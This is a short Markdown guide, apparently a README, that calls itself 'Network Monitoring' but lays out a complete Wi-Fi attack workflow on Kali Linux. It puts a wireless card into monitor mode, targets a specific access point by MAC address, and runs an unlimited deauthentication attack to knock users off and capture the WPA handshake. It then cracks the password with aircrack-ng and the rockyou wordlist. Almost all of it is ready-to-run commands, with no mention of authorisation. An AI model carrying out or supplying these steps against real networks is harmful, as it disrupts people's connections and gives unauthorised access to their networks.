# Network Monitoring

## Overview
This document provides a step-by-step guide for using various network monitoring and penetration testing commands on Kali Linux. Follow these instructions to check your Kali Linux version, verify network interfaces, manage processes, enable monitor mode, and perform deauthentication attacks using tools like `airmon-ng`, `airodump-ng`, `aireplay-ng`, `wireshark`, and `aircrack-ng`.

## Instructions

### Check Kali Linux Version
To determine which version of Kali Linux you are using, execute the following commands:
```sh
cat /etc/os-release
uname -a
```

### Check Internet Connection and Network Interfaces

Use the following commands to check the status of your network interfaces:

```
iwconfig   
ifconfig
ip addr
```


### Kill Conflicting Processes

Before starting monitor mode, kill any processes that might interfere:

```sh

sudo airmon-ng check kill
```
### Start Monitor Mode

Enable monitor mode on your wireless interface (e.g., wlan0):

```sh

sudo airmon-ng start wlan0
```
### Verify Monitor Mode

Confirm that monitor mode is enabled using:

```sh

sudo airmon-ng
# or
iwconfig
```

### Capture AP's MAC Address and Channel

Use airodump-ng to identify the Access Point (AP) you want to target:

```sh

sudo airodump-ng wlan0mon
```

Note down the AP's MAC address and channel. For example:

    AP-MAC: 90:9A:4A:B8:F3:FB
    Channel: 2

### Start Packet Capture

Open a new terminal window and start capturing packets:

```sh

sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon
```
### Perform Deauthentication Attack

In another terminal window, execute the deauthentication attack:

```sh

sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```
### Analyze Captured Packets

Open the captured packets file in Wireshark:

```sh

wireshark hack1-01.cap
```
Filter by eapol to find the handshake packets.
### Stop Monitor Mode

After completing the capture, stop monitor mode:

```sh

sudo airmon-ng stop wlan0mon
```
### Crack the Password

Use aircrack-ng to crack the password from the captured handshake:

```sh

aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```
### Display Specific AP

To focus on a specific AP, use the following command:

```sh

sudo airodump-ng wlan0mon -d 90:9A:4A:B8:F3:FB
```
### Deauthenticate User

To deauthenticate a user and stop their service, use:

```sh

sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
```
### Change Network Mode

Switch from 'Monitor' mode back to 'Managed Access Point' mode:

```sh

sudo airmon-ng stop wlan0mon
```

### Final Password Crack Attempt

Perform the final password crack attempt:

```sh

aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```
